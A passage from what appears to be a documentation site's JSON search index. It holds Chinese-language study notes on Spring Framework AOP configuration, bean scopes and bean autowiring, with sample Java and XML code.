top.longlone.service.UserServiceImpl.*(..))\" /> <aop:advisor advice-ref= \"log\" pointcut-ref= \"pointcut\" /> </aop:config> </beans> \u5b9e\u73b0\u65b9\u5f0f\u4e8c:\u81ea\u5b9a\u4e49\u7c7b # \u8fd9\u79cd\u65b9\u5f0f\u6709\u4e00\u4e2a\u7f3a\u70b9\u662f\u65e0\u6cd5\u62ff\u5230\u5207\u5165\u70b9\u548cTarget\u7684\u4fe1\u606f\uff0c\u4f18\u70b9\u662f\u66f4\u597d\u7406\u89e3\u3002 package top.longlone.log ; public class CustomLog { public void before () { System . out . println ( \"====\u6267\u884c\u524d====\" ); } public void after () { System . out . println ( \"====\u6267\u884c\u540e====\" ); } } <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop= \"http://www.springframework.org/schema/aop\" xsi:schemaLocation= \" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\" > <bean id= \"userService\" class= \"top.longlone.service.UserServiceImpl\" /> <bean id= \"log\" class= \"top.longlone.log.Log\" /> <bean id= \"customLog\" class= \"top.longlone.log.CustomLog\" /> <aop:config> <aop:aspect ref= \"customLog\" > <aop:pointcut id= \"pointcut\" expression= \"execution(* top.longlone.service.UserServiceImpl.*(..))\" /> <aop:before method= \"before\" pointcut-ref= \"pointcut\" /> <aop:after method= \"after\" pointcut-ref= \"pointcut\" /> </aop:aspect> </aop:config> </beans> \u5b9e\u73b0\u65b9\u5f0f\u4e09:\u6ce8\u89e3 # package top.longlone.log ; import org.aspectj.lang.annotation.After ; import org.aspectj.lang.annotation.Aspect ; import org.aspectj.lang.annotation.Around ; import org.aspectj.lang.annotation.Before ; @Aspect public class AnnotationLog { @Before ( \"execution(* top.longlone.service.UserServiceImpl.*(..))\" ) public void before () { System . out . println ( \"==\u6267\u884c\u524d==\" ); } @After ( \"execution(* top.longlone.service.UserServiceImpl.*(..))\" ) public void after () { System . out . println ( \"==\u6267\u884c\u540e==\" ); } @Around ( \"execution(* top.longlone.service.UserServiceImpl.*(..))\" ) public void around ( ProceedingJoinPoint jp ) throws Throwable { System . out . println ( \"\u73af\u7ed5\u524d\" ); System . out . println ( jp . getSignature ()); // \u8f93\u51fa\u7b7e\u540d System . out . println ( jp . getTarget ()); // \u83b7\u53d6\u88ab\u901a\u77e5\u5bf9\u8c61\u5e76\u8f93\u51fa Object proceed = jp . proceed (); System . out . println ( \"\u73af\u7ed5\u540e\" ); } } <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop= \"http://www.springframework.org/schema/aop\" xsi:schemaLocation= \" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\" > <bean id= \"userService\" class= \"top.longlone.service.UserServiceImpl\" /> <bean id= \"log\" class= \"top.longlone.log.Log\" /> <bean id= \"annotaionLog\" class= \"top.longlone.log.AnnotationLog\" /> <!-- \u5f00\u542f\u6ce8\u89e3\u652f\u6301 JDK proxy-target-class=\"false\" cglib proxy-target-class=\"true\" --> <aop:aspectj-autoproxy/> </beans> \u603b\u7ed3 # Spring\u4e2d\u7684AOP\u5176\u5b9e\u662f\u901a\u8fc7\u52a8\u6001\u4ee3\u7406\u5b9e\u73b0\u7684\u3002AOP\u6709\u51e0\u79cd\u4f7f\u7528\u65b9\u5f0f\uff0c\u5206\u522b\u662f: 1. \u4f7f\u7528\u539f\u751fSpring API\u63a5\u53e3 2. \u4f7f\u7528\u81ea\u5b9a\u4e49\u7c7b 3. \u4f7f\u7528\u6ce8\u89e3","title":"AOP"},{"location":"%E5%AE%89%E5%85%A8/java/spring/AOP/#aop","text":"AOP\u662fAspect Oriented Programming\uff0c\u5373\u9762\u5411\u5207\u9762\u7f16\u7a0b\u3002AOP\u662f\u4e00\u79cd\u65b0\u7684\u7f16\u7a0b\u65b9\u5f0f\uff0c\u5b83\u548cOOP\u4e0d\u540c\uff0cOOP\u628a\u7cfb\u7edf\u770b\u4f5c\u591a\u4e2a\u5bf9\u8c61\u7684\u4ea4\u4e92\uff0cAOP\u628a\u7cfb\u7edf\u5206\u89e3\u4e3a\u4e0d\u540c\u7684\u5173\u6ce8\u70b9\uff0c\u6216\u8005\u79f0\u4e4b\u4e3a\u5207\u9762\uff08Aspect\uff09\u3002","title":"AOP"},{"location":"%E5%AE%89%E5%85%A8/java/spring/AOP/#springaop","text":"\u5728SpringAOP\u4e2d\uff0c\u901a\u8fc7Advice\u5b9a\u4e49\u6a2a\u5207\u903b\u8f91\uff0cSpring\u652f\u63015\u79cd\u7c7b\u578b\u7684Advice:","title":"SpringAOP"},{"location":"%E5%AE%89%E5%85%A8/java/spring/AOP/#\u5bfc\u5165\u4f9d\u8d56","text":"\u8981\u5728Spring\u4e2d\u4f7f\u7528AOP\u7ec7\u5165\uff0c\u9700\u8981\u5bfc\u5165\u4ee5\u4e0b\u4f9d\u8d56 <dependency> <groupId> org.aspectj </groupId> <artifactId> aspectjweaver </artifactId> <version> 1.9.8.M1 </version> </dependency>","title":"\u5bfc\u5165\u4f9d\u8d56"},{"location":"%E5%AE%89%E5%85%A8/java/spring/AOP/#\u5b9e\u73b0\u65b9\u5f0f\u4e00\u539f\u751fspirng-api\u63a5\u53e3","text":"package top.longlone.service ; public interface UserService { public void add (); public void delete (); public void update (); public void query (); } package top.longlone.service ; import org.springframework.stereotype.Service ; public class UserServiceImpl implements UserService { @Override public void add () { System . out . println ( \"\u589e\u52a0\u4e00\u4e2a\u7528\u6237\" ); } @Override public void delete () { System . out . println ( \"\u5220\u9664\u4e00\u4e2a\u7528\u6237\" ); } @Override public void update () { System . out . println ( \"\u66f4\u65b0\u4e00\u4e2a\u7528\u6237\" ); } @Override public void query () { System . out . println ( \"\u67e5\u8be2\u4e00\u4e2a\u7528\u6237\" ); } } package top.longlone.log ; import org.springframework.aop.AfterReturningAdvice ; import org.springframework.aop.MethodBeforeAdvice ; import java.lang.reflect.Method ; public class Log implements MethodBeforeAdvice , AfterReturningAdvice { @Override public void before ( Method method , Object [] args , Object target ) throws Throwable { System . out . println ( target . getClass (). getName () + \"\u7684\" + method . getName () + \"\u6267\u884c\u4e4b\u524d\" ); } @Override public void afterReturning ( Object returnValue , Method method , Object [] args , Object target ) throws Throwable { System . out . println ( target . getClass (). getName () + \"\u7684\" + method . getName () + \"\u6267\u884c\u5b8c\u6bd5\" ); } } <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop= \"http://www.springframework.org/schema/aop\" xsi:schemaLocation= \" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\" > <bean id= \"userService\" class= \"top.longlone.service.UserServiceImpl\" /> <bean id= \"log\" class= \"top.longlone.log.Log\" /> <!-- \u65b9\u5f0f\u4e00:\u4f7f\u7528\u539f\u751fSpring API\u63a5\u53e3--> <!-- \u5bfc\u5165aop\uff0c\u9700\u8981\u5bfc\u5165aop\u7684\u7ea6\u675f --> <aop:config> <!-- \u589e\u52a0\u5207\u5165\u70b9\uff0cexpression:execution(\u4fee\u9970\u7b26 \u8fd4\u56de\u503c \u7c7b\u540d \u65b9\u6cd5\u540d \u53c2\u6570) --> <aop:pointcut id= \"pointcut\" expression= \"execution(public * top.longlone.service.UserServiceImpl.*(..))\" /> <aop:advisor advice-ref= \"log\" pointcut-ref= \"pointcut\" /> </aop:config> </beans>","title":"\u5b9e\u73b0\u65b9\u5f0f\u4e00:\u539f\u751fSpirng API\u63a5\u53e3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/AOP/#\u5b9e\u73b0\u65b9\u5f0f\u4e8c\u81ea\u5b9a\u4e49\u7c7b","text":"\u8fd9\u79cd\u65b9\u5f0f\u6709\u4e00\u4e2a\u7f3a\u70b9\u662f\u65e0\u6cd5\u62ff\u5230\u5207\u5165\u70b9\u548cTarget\u7684\u4fe1\u606f\uff0c\u4f18\u70b9\u662f\u66f4\u597d\u7406\u89e3\u3002 package top.longlone.log ; public class CustomLog { public void before () { System . out . println ( \"====\u6267\u884c\u524d====\" ); } public void after () { System . out . println ( \"====\u6267\u884c\u540e====\" ); } } <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop= \"http://www.springframework.org/schema/aop\" xsi:schemaLocation= \" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\" > <bean id= \"userService\" class= \"top.longlone.service.UserServiceImpl\" /> <bean id= \"log\" class= \"top.longlone.log.Log\" /> <bean id= \"customLog\" class= \"top.longlone.log.CustomLog\" /> <aop:config> <aop:aspect ref= \"customLog\" > <aop:pointcut id= \"pointcut\" expression= \"execution(* top.longlone.service.UserServiceImpl.*(..))\" /> <aop:before method= \"before\" pointcut-ref= \"pointcut\" /> <aop:after method= \"after\" pointcut-ref= \"pointcut\" /> </aop:aspect> </aop:config> </beans>","title":"\u5b9e\u73b0\u65b9\u5f0f\u4e8c:\u81ea\u5b9a\u4e49\u7c7b"},{"location":"%E5%AE%89%E5%85%A8/java/spring/AOP/#\u5b9e\u73b0\u65b9\u5f0f\u4e09\u6ce8\u89e3","text":"package top.longlone.log ; import org.aspectj.lang.annotation.After ; import org.aspectj.lang.annotation.Aspect ; import org.aspectj.lang.annotation.Around ; import org.aspectj.lang.annotation.Before ; @Aspect public class AnnotationLog { @Before ( \"execution(* top.longlone.service.UserServiceImpl.*(..))\" ) public void before () { System . out . println ( \"==\u6267\u884c\u524d==\" ); } @After ( \"execution(* top.longlone.service.UserServiceImpl.*(..))\" ) public void after () { System . out . println ( \"==\u6267\u884c\u540e==\" ); } @Around ( \"execution(* top.longlone.service.UserServiceImpl.*(..))\" ) public void around ( ProceedingJoinPoint jp ) throws Throwable { System . out . println ( \"\u73af\u7ed5\u524d\" ); System . out . println ( jp . getSignature ()); // \u8f93\u51fa\u7b7e\u540d System . out . println ( jp . getTarget ()); // \u83b7\u53d6\u88ab\u901a\u77e5\u5bf9\u8c61\u5e76\u8f93\u51fa Object proceed = jp . proceed (); System . out . println ( \"\u73af\u7ed5\u540e\" ); } } <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop= \"http://www.springframework.org/schema/aop\" xsi:schemaLocation= \" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\" > <bean id= \"userService\" class= \"top.longlone.service.UserServiceImpl\" /> <bean id= \"log\" class= \"top.longlone.log.Log\" /> <bean id= \"annotaionLog\" class= \"top.longlone.log.AnnotationLog\" /> <!-- \u5f00\u542f\u6ce8\u89e3\u652f\u6301 JDK proxy-target-class=\"false\" cglib proxy-target-class=\"true\" --> <aop:aspectj-autoproxy/> </beans>","title":"\u5b9e\u73b0\u65b9\u5f0f\u4e09:\u6ce8\u89e3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/AOP/#\u603b\u7ed3","text":"Spring\u4e2d\u7684AOP\u5176\u5b9e\u662f\u901a\u8fc7\u52a8\u6001\u4ee3\u7406\u5b9e\u73b0\u7684\u3002AOP\u6709\u51e0\u79cd\u4f7f\u7528\u65b9\u5f0f\uff0c\u5206\u522b\u662f: 1. \u4f7f\u7528\u539f\u751fSpring API\u63a5\u53e3 2. \u4f7f\u7528\u81ea\u5b9a\u4e49\u7c7b 3. \u4f7f\u7528\u6ce8\u89e3","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/","text":"Bean\u7684\u4f5c\u7528\u57df # singleton \u5355\u4f8b\u6a21\u5f0f # Bean\u7684\u9ed8\u8ba4\u4f5c\u7528\u57df\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0bBean\u90fd\u662f\u5355\u4f8b\u6a21\u5f0f\uff0c\u5373\u65e0\u8bba\u83b7\u53d6\u591a\u5c11\u6b21Bean\uff0c\u8fd4\u56de\u7684\u90fd\u662f\u76f8\u540c\u7684\u5b9e\u4f8b\uff0c\u4e5f\u53ef\u4ee5\u663e\u5f0f\u5730\u58f0\u660e\u8fd9\u4e2a\u4f5c\u7528\u57df: <bean id= \"user\" class= \"top.longlone.User\" c:age= \"18\" c:name= \"whoami\" scope= \"singleton\" /> prototype \u539f\u578b\u6a21\u5f0f # \u4e0e\u5355\u4f8b\u6a21\u5f0f\u5bf9\u5e94\uff0c\u6bcf\u6b21\u83b7\u53d6Bean\u90fd\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5b9e\u4f8b <bean id= \"user\" class= \"top.longlone.User\" c:age= \"18\" c:name= \"whoami\" scope= \"prototype\" /> \u6d4b\u8bd5\u5982\u4e0b: import org.springframework.context.ApplicationContext ; import org.springframework.context.support.ClassPathXmlApplicationContext ; import top.longlone.Student ; import top.longlone.User ; public class MyTest { public static void main ( String [] args ) { ApplicationContext context = new ClassPathXmlApplicationContext ( \"ApplicationContext.xml\" ); User user = context . getBean ( \"user\" , User . class ); User user2 = context . getBean ( \"user\" , User . class ); System . out . println ( user == user2 ); // false } } \u5176\u4ed6\u4f5c\u7528\u57df # \u5269\u4e0b\u7684\u4f5c\u7528\u57df\u90fd\u5728Web\u5f00\u53d1\u91cc\u624d\u80fd\u7528\u5230 request # session # application # websocket # \u603b\u7ed3 # \u4e3b\u8981\u4e86\u89e3\u4e86Bean\u7684\u4f5c\u7528\u57df\uff0c\u9700\u8981\u5148\u4e86\u89e3\u7684\u6709\u5355\u4f8b\u6a21\u5f0f(singleton)\u548c\u539f\u578b\u6a21\u5f0f(prototype)\uff0c\u4e24\u8005\u7684\u4e3b\u8981\u533a\u522b\u662f\u83b7\u53d6Bean\u65f6\u4f7f\u7528\u76f8\u540c\u7684\u5b9e\u4f8b\u5bf9\u8c61\u8fd8\u662f\u521b\u5efa\u65b0\u7684\u5b9e\u4f8b\u5bf9\u8c61\u3002","title":"Bean\u7684\u4f5c\u7528\u57df"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#bean\u7684\u4f5c\u7528\u57df","text":"","title":"Bean\u7684\u4f5c\u7528\u57df"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#singleton-\u5355\u4f8b\u6a21\u5f0f","text":"Bean\u7684\u9ed8\u8ba4\u4f5c\u7528\u57df\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0bBean\u90fd\u662f\u5355\u4f8b\u6a21\u5f0f\uff0c\u5373\u65e0\u8bba\u83b7\u53d6\u591a\u5c11\u6b21Bean\uff0c\u8fd4\u56de\u7684\u90fd\u662f\u76f8\u540c\u7684\u5b9e\u4f8b\uff0c\u4e5f\u53ef\u4ee5\u663e\u5f0f\u5730\u58f0\u660e\u8fd9\u4e2a\u4f5c\u7528\u57df: <bean id= \"user\" class= \"top.longlone.User\" c:age= \"18\" c:name= \"whoami\" scope= \"singleton\" />","title":"singleton \u5355\u4f8b\u6a21\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#prototype-\u539f\u578b\u6a21\u5f0f","text":"\u4e0e\u5355\u4f8b\u6a21\u5f0f\u5bf9\u5e94\uff0c\u6bcf\u6b21\u83b7\u53d6Bean\u90fd\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5b9e\u4f8b <bean id= \"user\" class= \"top.longlone.User\" c:age= \"18\" c:name= \"whoami\" scope= \"prototype\" /> \u6d4b\u8bd5\u5982\u4e0b: import org.springframework.context.ApplicationContext ; import org.springframework.context.support.ClassPathXmlApplicationContext ; import top.longlone.Student ; import top.longlone.User ; public class MyTest { public static void main ( String [] args ) { ApplicationContext context = new ClassPathXmlApplicationContext ( \"ApplicationContext.xml\" ); User user = context . getBean ( \"user\" , User . class ); User user2 = context . getBean ( \"user\" , User . class ); System . out . println ( user == user2 ); // false } }","title":"prototype \u539f\u578b\u6a21\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#\u5176\u4ed6\u4f5c\u7528\u57df","text":"\u5269\u4e0b\u7684\u4f5c\u7528\u57df\u90fd\u5728Web\u5f00\u53d1\u91cc\u624d\u80fd\u7528\u5230","title":"\u5176\u4ed6\u4f5c\u7528\u57df"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#request","text":"","title":"request"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#session","text":"","title":"session"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#application","text":"","title":"application"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#websocket","text":"","title":"websocket"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#\u603b\u7ed3","text":"\u4e3b\u8981\u4e86\u89e3\u4e86Bean\u7684\u4f5c\u7528\u57df\uff0c\u9700\u8981\u5148\u4e86\u89e3\u7684\u6709\u5355\u4f8b\u6a21\u5f0f(singleton)\u548c\u539f\u578b\u6a21\u5f0f(prototype)\uff0c\u4e24\u8005\u7684\u4e3b\u8981\u533a\u522b\u662f\u83b7\u53d6Bean\u65f6\u4f7f\u7528\u76f8\u540c\u7684\u5b9e\u4f8b\u5bf9\u8c61\u8fd8\u662f\u521b\u5efa\u65b0\u7684\u5b9e\u4f8b\u5bf9\u8c61\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/","text":"Bean\u7684\u88c5\u914d # \u5728Spring\u4e2d\u6709\u4e09\u79cd\u88c5\u914d\u65b9\u5f0f - xml\u914d\u7f6e - java\u4ee3\u7801\u914d\u7f6e - \u9690\u5f0f\u81ea\u52a8\u914d\u7f6e Bean\u7684\u81ea\u52a8\u88c5\u914d # Spring\u4f1a\u5728\u4e0a\u4e0b\u6587\u4e2d\u81ea\u52a8\u5bfb\u627e\uff0c\u5e76\u81ea\u52a8\u7ed9Bean\u88c5\u914d\u5c5e\u6027 \u901a\u8fc7xml\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d # \u4e3b\u8981\u662f\u901a\u8fc7beans\u4e2d\u7684default-autowire\u5c5e\u6027\u6216\u8005bean\u4e2d\u7684autowire\u5c5e\u6027\u6765\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d byName\u81ea\u52a8\u88c5\u914d # \u5f53\u8bbe\u7f6e\u5c5e\u6027\u503c\u4e3abyName\u65f6\uff0cBean\u4f1a\u5728\u4e0a\u4e0b\u6587\u4e2d\u5bfb\u627e\u4e0e\u5c5e\u6027\u540d\u76f8\u540c\u7684Beanid\u5e76\u81ea\u52a8\u6ce8\u5165\u4f9d\u8d56\uff0c\u5fc5\u987b\u4fdd\u8bc1Bean\u540d\u5b57\u552f\u4e00\u3002 byType\u81ea\u52a8\u88c5\u914d # \u5f53\u8bbe\u7f6e\u5c5e\u6027\u503c\u4e3abyType\u65f6\uff0cBean\u4f1a\u5728\u4e0a\u4e0b\u6587\u4e2d\u5bfb\u627e\u4e0e\u5c5e\u6027\u7c7b\u578b\u76f8\u540c\u7684Bean\u5e76\u81ea\u52a8\u6ce8\u5165\u4f9d\u8d56\uff0c\u5fc5\u987b\u4fdd\u8bc1\u540c\u610f\u7c7b\u578b\u7684Bean\u552f\u4e00\u3002 constructor\u81ea\u52a8\u88c5\u914d # \u548cbyType\u81ea\u52a8\u88c5\u914d\u7c7b\u4f3c\uff0c\u4e5f\u662f\u6839\u636e\u7c7b\u578b\u53bb\u81ea\u52a8\u88c5\u914d\uff0c\u4f46\u662f\u662f\u8c03\u7528\u6784\u9020\u51fd\u6570\u5b9e\u73b0\u4f9d\u8d56\u6ce8\u5165\u3002 \u6ce8\u89e3\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d # \u4f9d\u8d56: 1. jdk>=1.5 2. spring>=2.5 \u4f7f\u7528\u524d\u9700\u8981\u5bfc\u5165\u6269\u5c55\u548c\u914d\u7f6e\u6ce8\u89e3\u652f\u6301 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:context= \"http://www.springframework.org/schema/context\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/beans/spring-context.xsd\" > <context:annotation-config/> </beans> \u4f7f\u7528\u65b9\u6cd5 \u4f9d\u7136\u5728xml\u4e2d\u7f16\u5199bean\uff0c\u4f46\u662f\u4e0d\u9700\u8981\u518d\u6ce8\u5165\u5c5e\u6027 <bean id= \"people\" class= \"top.longlone.People\" /> <bean id= \"dog\" class= \"top.longlone.Dog\" /> \u7136\u540e\u5728\u4ee3\u7801\u5c5e\u6027\u4e0a\u4f7f\u7528@Autowired\u6ce8\u89e3\uff0c\u5b9e\u73b0\u7684\u6548\u679c\u662f\u5148\u7c7b\u4f3c\u4e8ebyType\u81ea\u52a8\u88c5\u914d\uff0c\u82e5\u6709\u591a\u4e2a\u76f8\u540c\u7c7b\u578b\uff0c\u5219\u7c7b\u4f3c\u4e8ebyName\u81ea\u52a8\u88c5\u914d package top.longlone ; import org.springframework.beans.factory.annotation.Autowired ; public class People { @Autowired private Dog dog ; // \u7701\u7565getter setter toStirng\u65b9\u6cd5 @Autowired\u53ef\u4ee5\u8bbe\u7f6e\u5c5e\u6027required\uff0c\u9ed8\u8ba4\u4e3atrue\uff0c\u82e5\u8bbe\u7f6e\u4e3afalse\uff0c\u5219\u58f0\u660e\u8fd9\u4e2a\u4f9d\u8d56\u662f\u975e\u5fc5\u987b\u7684\uff0c\u53ef\u4ee5\u4e3a\u7a7a ```java package top.longlone; import org.springframework.beans.factory.annotation.Autowired; public class People { @Autowired(required = false) private Dog dog; } \u5982\u679c\u6709\u591a\u4e2a\u76f8\u540c\u7c7b\u578b\u7684bean\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528@Qualifier\u6ce8\u89e3\u6765\u6307\u5b9a\u4f7f\u7528\u54ea\u4e2a\u540d\u5b57\u7684bean ```java package top.longlone; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.beans.factory.annotation.Qualifier; public class People { @Autowired @Qualifier(value = \"dog\") private Dog dog; } \u5728java<11\u4e2djva\u539f\u751f\u81ea\u5e26\u4e86\u4e00\u4e2a@Resource\u6ce8\u89e3\uff0c\u5b83\u7684\u4f5c\u7528\u548c@Autowired\u7c7b\u4f3c\uff0c\u5b9e\u73b0\u7684\u6548\u679c\u662f\u5148\u7c7b\u4f3c\u4e8ebyName\u81ea\u52a8\u88c5\u914d\uff0c\u82e5\u65e0\u6cd5\u627e\u5230\u5bf9\u5e94\u7684id\uff0c\u5219\u7c7b\u4f3cbyType\u81ea\u52a8\u88c5\u914d\uff0c\u540c\u65f6\u5b83\u53ef\u4ee5\u6267\u884cname\u5c5e\u6027\u6765\u6307\u5411\u5177\u4f53\u7684\u4e00\u4e2abean package top.longlone ; import javax.annotation.Resource ; public class People { @Resource ( name = \"dog22\" ) private Dog dog ; } java11\u53ca\u4e4b\u540e\u9700\u8981\u901a\u8fc7\u6dfb\u52a0\u4f9d\u8d56\u7684\u65b9\u5f0f\u624d\u80fd\u4f7f\u7528@Resource\u6ce8\u89e3 <dependency> <groupId> javax.annotation </groupId> <artifactId> javax.annotation-api </artifactId> <version> 1.3.1 </version> </dependency> \u603b\u7ed3 # Bean\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d\u6709\u4e24\u79cd\u65b9\u5f0f\uff0c\u5206\u522b\u662f\u901a\u8fc7xml\u548c\u901a\u8fc7\u6ce8\u89e3\u3002 Bean\u901a\u8fc7xml\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d\u6709\u4e09\u79cd\u65b9\u5f0f\uff0c\u5206\u522b\u662fbyName\uff0cbyType\u548cconstructor\u3002 Bean\u901a\u8fc7\u6ce8\u89e3\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d\u6709\u4e09\u4e2a\u5e38\u89c1\u6ce8\u89e3\uff0c\u5206\u522b@Autowired\uff0c@Qualfilter\uff0c@Resource","title":"Bean\u7684\u88c5\u914d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/#bean\u7684\u88c5\u914d","text":"\u5728Spring\u4e2d\u6709\u4e09\u79cd\u88c5\u914d\u65b9\u5f0f - xml\u914d\u7f6e - java\u4ee3\u7801\u914d\u7f6e - \u9690\u5f0f\u81ea\u52a8\u914d\u7f6e","title":"Bean\u7684\u88c5\u914d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/#bean\u7684\u81ea\u52a8\u88c5\u914d","text":"Spring\u4f1a\u5728\u4e0a\u4e0b\u6587\u4e2d\u81ea\u52a8\u5bfb\u627e\uff0c\u5e76\u81ea\u52a8\u7ed9Bean\u88c5\u914d\u5c5e\u6027","title":"Bean\u7684\u81ea\u52a8\u88c5\u914d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/#\u901a\u8fc7xml\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d","text":"\u4e3b\u8981\u662f\u901a\u8fc7beans\u4e2d\u7684default-autowire\u5c5e\u6027\u6216\u8005bean\u4e2d\u7684autowire\u5c5e\u6027\u6765\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d","title":"\u901a\u8fc7xml\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/#byname\u81ea\u52a8\u88c5\u914d","text":"\u5f53\u8bbe\u7f6e\u5c5e\u6027\u503c\u4e3abyName\u65f6\uff0cBean\u4f1a\u5728\u4e0a\u4e0b\u6587\u4e2d\u5bfb\u627e\u4e0e\u5c5e\u6027\u540d\u76f8\u540c\u7684Beanid\u5e76\u81ea\u52a8\u6ce8\u5165\u4f9d\u8d56\uff0c\u5fc5\u987b\u4fdd\u8bc1Bean\u540d\u5b57\u552f\u4e00\u3002","title":"byName\u81ea\u52a8\u88c5\u914d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/#bytype\u81ea\u52a8\u88c5\u914d","text":"\u5f53\u8bbe\u7f6e\u5c5e\u6027\u503c\u4e3abyType\u65f6\uff0cBean\u4f1a\u5728\u4e0a\u4e0b\u6587\u4e2d\u5bfb\u627e\u4e0e\u5c5e\u6027\u7c7b\u578b\u76f8\u540c\u7684Bean\u5e76\u81ea\u52a8\u6ce8\u5165\u4f9d\u8d56\uff0c\u5fc5\u987b\u4fdd\u8bc1\u540c\u610f\u7c7b\u578b\u7684Bean\u552f\u4e00\u3002","title":"byType\u81ea\u52a8\u88c5\u914d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/#constructor\u81ea\u52a8\u88c5\u914d","text":"\u548cbyType\u81ea\u52a8\u88c5\u914d\u7c7b\u4f3c\uff0c\u4e5f\u662f\u6839\u636e\u7c7b\u578b\u53bb\u81ea\u52a8\u88c5\u914d\uff0c\u4f46\u662f\u662f\u8c03\u7528\u6784\u9020\u51fd\u6570\u5b9e\u73b0\u4f9d\u8d56\u6ce8\u5165\u3002","title":"constructor\u81ea\u52a8\u88c5\u914d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/#\u6ce8\u89e3\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d","text":"\u4f9d\u8d56: 1. jdk>=1.5 2. spring>=2.5 \u4f7f\u7528\u524d\u9700\u8981\u5bfc\u5165\u6269\u5c55\u548c\u914d\u7f6e\u6ce8\u89e3\u652f\u6301 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:context= \"http://www.springframework.org/schema/context\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/beans/spring-context.xsd\" > <context:annotation-config/> </beans> 